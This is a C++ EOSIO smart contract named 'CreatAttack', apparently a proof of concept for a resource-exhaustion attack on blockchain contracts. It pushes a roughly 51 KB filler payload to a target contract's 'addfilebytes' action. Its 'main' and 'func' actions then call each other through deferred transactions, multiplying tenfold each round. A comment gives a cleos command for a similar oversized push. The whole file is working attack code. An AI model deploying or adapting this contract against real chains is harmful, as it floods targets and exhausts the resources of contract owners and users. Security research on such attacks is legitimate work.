//#include <eosiolib/permission.hpp>
#include <eosiolib/eosio.hpp>
#include <eosiolib/print.hpp>
#include <eosiolib/action.hpp>
//#include <eosiolib/transaction.h>
#include <eosiolib/contract.hpp>
#include <eosiolib/permission.hpp>
#include <eosiolib/action.h>
#include <eosio/serialize.hpp>
using namespace eosio;

class [[eosio::contract]] CreatAttack : public eosio::contract {
    public:
      using contract::contract;
        [[eosio::action]]
        void main(name client, name TC ,uint64_t idx)
        {
            uint128_t initnum = 1;
            transaction out1{};
            transaction target{};

            int N = 10; // N division

            /////////////// TARGET CONTRACT METHOD ARGUMENT //////////
            // cleos push action provider addfilebytes "[8,`python -c 'print \"B\"*70480'`,70480]" -p client@active
            //////////////////////////////////////////////////////////////
            
			name targetContract = TC;
            name targetMethod = name("addfilebytes");
            
			std::string A = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"; //A*50
            for ( int i = 0; i < 10; i++)
            {
                A = A+A;
            }
			target.actions.emplace_back(permission_level{_self, "active"_n}, targetContract , targetMethod , std::make_tuple(idx,A, A.length()));
			//target.actions.emplace_back(permission_level{ client , "active"_n}, targetContract,  targetMethod, argu);
            target.send(idx, client);
			
            /////////////// Multi Dimension Call ///////////////////////
            for (int i =0; i < N ; i ++)
            {
                out1.actions.emplace_back(permission_level{client, "active"_n}, _self, "func"_n, std::make_tuple( client, TC , uint64_t(N * idx + (1-i))) );
                out1.send(N * idx + (1-i), client, false);
                out1.actions.pop_back();
                print ("[+] Seq Number :%d \n", N * idx + (1-i) );
            }
			
        }
        [[eosio::action]]
        void func(name client, name target ,uint64_t idx)
        {
            auto argu = std::make_tuple(client, target , uint64_t(idx));
			/*
			int N = 1;
			transaction out{};
			out.actions.emplace_back(permission_level{currentContract, "active"_n},\
					currentContract , "main"_n, std::make_tuple(currentContract, uint64_t(idx + N)));
			out.delay_sec = 0;
			out.send((idx+N), currentContract, false);
			*/
            transaction out{};
            out.actions.emplace_back(permission_level{client, "active"_n}, _self, "main"_n, argu );
            out.send((idx), client, false);
            print("\t[#] FUNC: ", idx);
        };
};

EOSIO_DISPATCH( CreatAttack, (main)(func) )

